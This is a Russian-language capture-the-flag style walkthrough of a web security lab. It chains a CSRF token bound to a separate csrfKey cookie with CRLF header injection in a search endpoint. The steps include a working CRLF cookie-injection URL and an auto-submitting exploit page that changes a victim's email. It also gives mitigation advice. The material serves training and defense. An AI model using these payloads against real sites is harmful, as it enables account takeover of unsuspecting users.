<a id="goal"></a>
## 🎯 Цель
Функционал смены email защищён CSRF-токеном, но токен **не полностью интегрирован в систему управления сессиями** сайта — он привязан к отдельной cookie `csrfKey`, а не к сессии. Задача:

1. Использовать exploit server для размещения HTML-страницы с CSRF-атакой.
2. Изменить email жертвы через CSRF.

Для проработки атаки даны два аккаунта: `wiener:peter` и `carlos:montoya`.

*Подсказка: нельзя зарегистрировать email, уже занятый другим пользователем. Если при тестировании меняешь свой email — в финальном эксплойте для жертвы используй другой адрес.*

<a id="theory"></a>
## 🧠 Краткая теория
CSRF (Cross-Site Request Forgery) — атака, при которой злоумышленник заставляет браузер жертвы выполнить нежелательное действие на уязвимом сайте, где жертва аутентифицирована.

CSRF-токен эффективен только тогда, когда он **привязан к сессии жертвы**. Распространённый дефект дизайна — привязка токена к **отдельной cookie** (`csrfKey`) вместо сессии. Поскольку и токен, и ключ вместе путешествуют в браузере атакующего, пара взаимозаменяема между пользователями. Хуже того: если какой-либо endpoint отражает пользовательский ввод в заголовок `Set-Cookie` (CRLF-инъекция), атакующий может **внедрить свою csrfKey-cookie в браузер жертвы** — заставив жертву использовать пару атакующего, которую сервер успешно валидирует.

<a id="idea"></a>
## 🧩 Ключевая идея
Комбинация двух изъянов:

- Пара cookie `csrfKey` + параметр `csrf` **не привязана к сессии** — пара атакующего работает в сессии жертвы.
- Search-endpoint отражает ввод в `Set-Cookie` (CRLF-инъекция) — атакующий может установить свою `csrfKey`-cookie в браузере жертвы кросс-доменно.

**Цепочка:** страница эксплойта сначала инъецирует `csrfKey` атакующего в браузер жертвы через `<img>`, бьющий в уязвимый search-endpoint, затем сабмитит форму смены email с соответствующим токеном `csrf`. Сессия жертвы + ключ атакующего + токен атакующего = валидный запрос.

<a id="attack-scheme"></a>
## 🗺 Схема атаки
1. **Разведка:** Перехват `POST /my-account/change-email` от wiener; фиксация cookie `csrfKey` и параметра `csrf`.
2. **Тест:** Смена `session` → логаут; смена `csrfKey` → лишь отказ токена (не привязана к сессии).
3. **Проверка:** Сессия carlos + пара `csrfKey`/`csrf` wiener'а → принято → пара переносима.
4. **Точка инъекции:** Search-запрос отражается в `Set-Cookie` → CRLF-инъекция cookie.
5. **Эксплойт:** Инъекция `csrfKey` атакующего через `<img>` (CRLF), затем автосабмит формы с соответствующим токеном `csrf`.
6. **Проверка:** View exploit на себе → email изменён.
7. **Доставка:** Deliver to victim → лаба решена.

<a id="step1"></a>
## 🔍 Шаг 1 — Анализ легитимного запроса
Авторизовался под `wiener:peter` в браузере Burp, отправил форму «Update email» и нашёл результирующий запрос в Proxy history. Отправил его в Repeater.

Обратил внимание: запрос несёт **два защитных артефакта** — cookie `session` и отдельную cookie `csrfKey`, плюс параметр `csrf` в теле.

```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER; csrfKey=CSRFKEY_WIENER
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_WIENER
```

<a id="step2"></a>
## 🔍 Шаг 2 — Тест session vs csrfKey
В Repeater:

- Изменил cookie `session` → **логаут** (сессия строго валидируется).
- Изменил cookie `csrfKey` → запрос отклонён с "Invalid CSRF token", но **без логаута**.

*Вывод: csrfKey не является частью сессии; она живёт в своей cookie со своим путём валидации.*

<a id="step3"></a>
## 🔍 Шаг 3 — Тест токена между аккаунтами
Открыл инкогнито-окно, залогинился под `carlos:montoya`, отправил свежий запрос смены email в Repeater.

Подставил **и** cookie `csrfKey` **и** параметр `csrf` из запроса wiener'а в запрос carlos:

```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_CARLOS; csrfKey=CSRFKEY_WIENER
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_WIENER
```

**Результат:** запрос **принят** — сессия carlos сработала с парой csrfKey/csrf wiener'а.

*Вывод: пара ключ/токен не привязана к пользователю — она переносима между аккаунтами.*

<a id="step4"></a>
## 🔍 Шаг 4 — Поиск точки инъекции cookie
Закрыл Repeater и инкогнито. В исходном браузере выполнил **поиск** на сайте и отправил запрос в Repeater.

Обнаружил, что поисковый запрос **отражается в заголовке ответа `Set-Cookie`** (например, `Set-Cookie: search=test; ...`). Функция поиска **не имеет CSRF-защиты**, поэтому любой origin может её вызвать и посадить cookie в браузер жертвы.

PoC-URL инъекции (URL-кодированный CRLF `%0d%0a`):

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=CSRFKEY_WIENER%3b%20SameSite=None
```

- `%0d%0a` — CRLF, выход из отражаемого значения в новый заголовок.
- `SameSite=None` — обязательно, чтобы браузер отправлял cookie в кросс-сайтовых запросах.

<a id="step5"></a>
## 🔍 Шаг 5 — Сборка CSRF-эксплойта с инъекцией cookie
Собрал эксплойт на основе запроса смены email, включив токен `csrf` wiener'а, затем **удалил блок автосабмита `<script>`** и заменил его на `<img>`, который сначала инъецирует cookie, а сабмитит форму в обработчике `onerror`:

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="csrf" value="CSRF_TOKEN_WIENER">
    <input type="hidden" name="email" value="attacker@web-security-academy.net">
</form>
<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CSRFKEY_WIENER%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

**Как это работает:**
1. `<img>` инициирует GET к уязвимому search-endpoint → ответ содержит `Set-Cookie: csrfKey=CSRFKEY_WIENER; SameSite=None` → браузер жертвы теперь хранит ключ атакующего.
2. Картинка не рендерится (это не валидное изображение) → срабатывает `onerror` → форма отправляется с соответствующим токеном `csrf`.
3. Сессия жертвы + инъецированный csrfKey + токен атакующего → сервер принимает запрос.

<a id="step6"></a>
## 🔍 Шаг 6 — Проверка эксплойта на себе
Разместил HTML в поле «Body» exploit-сервера, сохранил и нажал «View exploit». Убедился, что email изменён.

⚠️ Согласно подсказке: email должны быть уникальными — в финальном эксплойте используй **другой** адрес, чем при тестировании (например, смени на ещё один новый).

<a id="step7"></a>
## 🔍 Шаг 7 — Доставка эксплойта жертве
Обновил email в эксплойте на свежий неиспользованный адрес, сохранил и нажал «Deliver to victim». Email жертвы изменён → лаба решена.

## 📥 Пример результата
**Межаккаунтный тест пары**

→ Пара ключ/токен переносима между пользователями

**Проверка инъекции cookie**
- `GET /?search=test%0d%0aSet-Cookie: csrfKey=...` → ответ содержит `Set-Cookie: csrfKey=...; SameSite=None`  
→ CRLF-инъекция работает, cookie сажается кросс-доменно

**Эксплойт**

<a id="attack-chain"></a>
## 🧾 Полная цепочка атаки
1. Логин под wiener → перехват `POST /my-account/change-email` → фиксация cookie csrfKey + токена csrf.
2. Repeater: смена session → логаут; смена csrfKey → лишь отказ токена.
3. Инкогнито: carlos + пара wiener'а → принято → пара переносима.
4. Search-endpoint → отражение в `Set-Cookie` → CRLF-инъекция cookie.
5. Эксплойт: `<img>` инъецирует csrfKey (SameSite=None), `onerror` сабмитит форму с соответствующим csrf-токеном.
6. View exploit → проверка на себе → email изменён.
7. Свежий email в эксплойте → Deliver to victim → **Solved**.

<a id="breakdown"></a>
## 🔬 Почему атака сработала
- **Токен привязан не туда:** CSRF-токен спарен с отдельной cookie `csrfKey`, а не с сессией — пара переносима между пользователями.
- **Атакующий — тоже пользователь:** сайт выдаёт настоящую пару ключ/токен аккаунту атакующего.
- **CRLF-инъекция в Set-Cookie:** search-endpoint отражает ввод в заголовок `Set-Cookie`, позволяя атакующему кросс-доменно устанавливать cookie в браузере жертвы.
- **SameSite=None:** без этого атрибута инъецированная cookie не отправлялась бы в кросс-сайтовом POST; инъекция явно устанавливает его.
- **Цепочка примитивов:** инъекция cookie (GET, без CSRF-защиты) + автосабмит формы (POST) = полный обход CSRF-защиты.

<a id="pentester"></a>
## 🧠 Как думать как пентестер
1. **Спрашивай, к чему привязан токен:** сессия, отдельная cookie или ничто — тестируй каждый артефакт отдельно.
2. **Тестируй переносимость между своими аккаунтами:** если пара ключ/токен аккаунта A работает для аккаунта B — пара не привязана к сессии.
3. **Ищи точки инъекции cookie:** отражение в `Set-Cookie` (CRLF) превращает «переносимую пару» в полноценный эксплойт.
4. **Помни про SameSite:** инъецированным cookie нужен `SameSite=None`, чтобы отправляться в кросс-сайтовых запросах.
5. **Соединяй примитивы:** безобидное на вид отражение (поле поиска) может быть недостающим звеном эксплойта.

<a id="mistakes"></a>
## ❌ Типичные ошибки
- **Подмена только параметра csrf:** один токен отклоняется — cookie `csrfKey` нужно подменять **вместе** с параметром `csrf`.
- **Забыт SameSite=None в инъекции:** без него браузер не отправит инъецированную cookie в кросс-сайтовом POST.
- **Оставлен автосабмит `<script>`:** скрипт сработает до того, как `<img>` установит cookie — удали его и сабмить из `onerror`.
- **Одинаковый email в тесте и финальном эксплойте:** email уникальны; финальному эксплойту нужен другой адрес.
- **Ошибки URL-кодирования:** `%0d%0a` для CRLF, `%3b` для `;`, `%20` для пробелов — некодированные символы ломают инъекцию заголовка.
- **«Сжигание» пары токенов:** если запросы начали падать — перегенерируй пару, заново открыв страницу аккаунта.

<a id="defense"></a>
## 🛡 Защита
- **Привязывать CSRF-токен к сессии** — валидировать пару (сессия, токен) на сервере; без отдельной cookie csrfKey.
- Использовать CSRF-защиту уровня фреймворка, привязанную к состоянию сессии.
- **Устранить CRLF-инъекцию** — санировать/отклонять CR/LF в любом вводе, отражаемом в заголовки ответа; современные фреймворки отклоняют header-инъекцию по умолчанию.
- **SameSite-cookies** (Lax/Strict) для сессионной cookie как эшелонированная защита.
- Проверка заголовков **Origin/Referer** для запросов, изменяющих состояние.

<a id="conclusion"></a>
## 🧾 Итог
Лаба демонстрирует, что CSRF-токен является защитой только тогда, когда он привязан к **сессии** жертвы. Привязка к отдельной cookie создаёт переносимую пару ключ/токен, а CRLF-инъекция в незащищённом search-endpoint позволяет атакующему посадить свою пару в браузер жертвы. Ключевой урок: анализируй, к чему реально привязан защитный артефакт, и рассматривай любое отражение в заголовки как потенциальный примитив инъекции cookie — в комбинации две minor-уязвимости превращаются в полный обход CSRF-защиты.
